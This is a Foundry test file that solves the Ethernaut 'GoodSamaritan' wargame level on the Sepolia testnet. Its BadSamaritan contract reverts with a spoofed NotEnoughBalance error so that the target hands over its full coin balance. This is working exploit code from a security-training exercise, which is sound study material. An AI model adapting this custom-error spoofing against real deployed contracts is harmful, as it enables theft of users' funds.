// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/27-GoodSamaritan/GoodSamaritan.sol";

contract ContractTest is Test {
    BadSamaritan BadSamaritanContract;
    GoodSamaritan level27 = GoodSamaritan(payable(0xf67f52961F2b5a026CE96c3ffaabe0CF1Baa8006));

    function setUp() public {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    vm.createSelectFork(vm.rpcUrl("sepolia"));
    BadSamaritanContract = new BadSamaritan();
    }

    function testExploit27() public {
        console.log(level27.coin().balances(address(level27.wallet())));
        BadSamaritanContract.attax();
        console.log(level27.coin().balances(address(level27.wallet())));
        console.log(level27.coin().balances(address(BadSamaritanContract)));
    }
  receive() external payable {}
}

contract BadSamaritan {

    error NotEnoughBalance();

    GoodSamaritan goodsamaritan  = GoodSamaritan(0xf67f52961F2b5a026CE96c3ffaabe0CF1Baa8006); //ethernaut instance address
    function attax() external {
        goodsamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}